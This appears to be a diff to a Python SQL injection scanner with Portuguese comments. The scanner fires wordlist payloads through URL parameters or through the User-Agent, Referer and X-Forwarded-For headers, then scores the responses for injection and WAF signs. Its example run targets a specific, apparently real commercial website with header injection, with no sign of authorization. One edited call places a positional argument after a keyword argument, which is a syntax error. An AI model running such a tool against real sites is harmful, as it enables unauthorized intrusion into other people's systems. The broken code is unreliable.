@@ -55,8 +55,12 @@ async def sqli_waf_detection(response):
     score += sum(v for v in waf_possibility.values())
     return True if score >= 10 else False
 
-
-async def response_analyzer(origin, payload, response, continue_):
+# origin -> origem
+# payload -> carga enviada
+# response -> resposta bruta da request
+# score_sqli -> score que atesta vulnerabilidade
+# continue_ -> valor booleano que decide se continua ou nao apos encontrar vulnerabilidade
+async def response_analyzer(origin, payload, response, score_sqli, continue_):
     score = 0
     details = {}
     html_sample = ""
@@ -136,8 +140,6 @@ async def response_analyzer(origin, payload, response, continue_):
 
     return details, score, html_sample
 
-import random
-import asyncio
 
 async def sqli(origin, option='query string', file=None, ua_status=False, headers=None, timeout=10, SSL=True, proxies=None, interval=0, continue_=False, score_sqli=False, try_requests=1):
     name_save_file = 'sqli_test.json'
@@ -155,12 +157,13 @@ async def sqli(origin, option='query string', file=None, ua_status=False, header
     async def engine(payload, url, headers=None):
         await asyncio.sleep(interval)
         print(f'[+][{commons.time_now()}] Tentando: {url}')
-        
+        if option == 'headers':
+            print(f'{" "*3}[>][{commons.time_now()}] {headers}')
         status, r = commons.request(url, timeout=timeout, SSL=SSL, headers=headers,
                                     ua_status=ua_status, redirect=False, proxies=proxies, try_requests=try_requests)
         
         if status:
-            details, score, html_sample = await response_analyzer(origin, payload, r, continue_)
+            details, score, html_sample = await response_analyzer(origin, payload, r, score_sqli=score_sqli, continue_)
         else:
             print(f'{" "*3}[>][{commons.time_now()}] Falha ao requisitar: {r}')
             details, score, html_sample = {}, 0, ''
@@ -177,7 +180,7 @@ async def sqli(origin, option='query string', file=None, ua_status=False, header
             url = f'{scheme}://{origin}'.replace('*', payload)
             await engine(payload, url)
 
-        return True, f'[#] Payloads concluídos: {file} → {name_save_file}'
+        return True, f'[#][{commons.time_now()}] Wordlist concluida: {file} → {name_save_file}'
 
     elif option == 'headers':
         total_combinations = len(payloads) ** 3
@@ -195,19 +198,21 @@ async def sqli(origin, option='query string', file=None, ua_status=False, header
 
             used_combinations.add(combo_key)
             url = f'{scheme}://{origin}'  # aqui o payload está no header, não na URL
-            await engine(f'UA:{ua}|Ref:{ref}|IP:{ip}', url, headers=current_headers)
+            await engine(f'UA:{current_headers["User-Agent"]}|Ref:{current_headers["Referer"]}|IP:{current_headers["X-Forwarded-For"]}', url, headers=current_headers)
 
-        return True, f'[#] Headers concluídos: {file} → {name_save_file}'
+        return True, f'[#][{commons.time_now()}] Wordlist concluida: {file} → {name_save_file}'
 
     else:
-        return False, f'[-] Opção inválida: {option}'
+        return False, f'[-][{commons.time_now()}] Opcao invalida: {option}'
 
 
+# www.constinta.com.br/v1-index-php-lojas?srsltid=*
 # Exemplo de uso
 async def main():
     try:
         status, attk = await sqli(
-            'www.constinta.com.br/v1-index-php-lojas?srsltid=*',
+            'www.constinta.com.br',
+            option='headers',
             continue_=True,
             score_sqli=True,
         )
